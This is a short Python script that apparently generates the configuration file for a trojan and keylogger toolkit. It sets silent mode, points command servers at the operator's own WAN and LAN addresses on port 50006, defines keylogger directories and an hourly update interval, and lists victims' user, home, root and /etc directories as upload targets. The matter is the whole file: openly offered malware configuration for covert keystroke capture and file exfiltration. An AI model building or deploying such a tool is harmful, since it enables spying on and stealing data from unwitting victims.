import os
import myip

def build_config(fileName, parameters):
    with open(fileName, 'w') as fp:
        maxlen = max([len(x) for x in parameters.keys()])
        for key, value in parameters.items():
            fp.write('%s = %s\n' % (key.ljust(maxlen), str(value)))

if __name__ == '__main__':
    parameters = {
            'MAX_BANNER_LEN':  1024,
            'SILENT_MODE':     True,
            'SERVERS':         [myip.myip_wan(), myip.myip_lan()],
            'PORT':            50006,
            'trojan_dirs':     { 'Windows': 'C:\\Trojan',
                                 'Linux':   '/tmp', },
            'keylogger_dirs':  { 'Windows': ['C:\\KeyLogger'], },
            'upload_dirs':     { 'Windows': ['C:\\Users', 'D:', 'E:', 'F:'],
                                 'Linux':   ['/etc', '/home', '/root'],},
            'max_size':        16 * 1024 * 1024,
            'max_file':        0,
            'update_interval': 60 * 60,   # seconds
            'keylog_interval': 3,
            'save_dir':        {'Windows': 'C:\\temp',
                                'Linux':   '/tmp', }
            }
    dirName  = os.path.dirname(os.path.abspath(__file__))
    fileName = os.path.join(dirName, 'config.py')
    build_config(fileName, parameters)
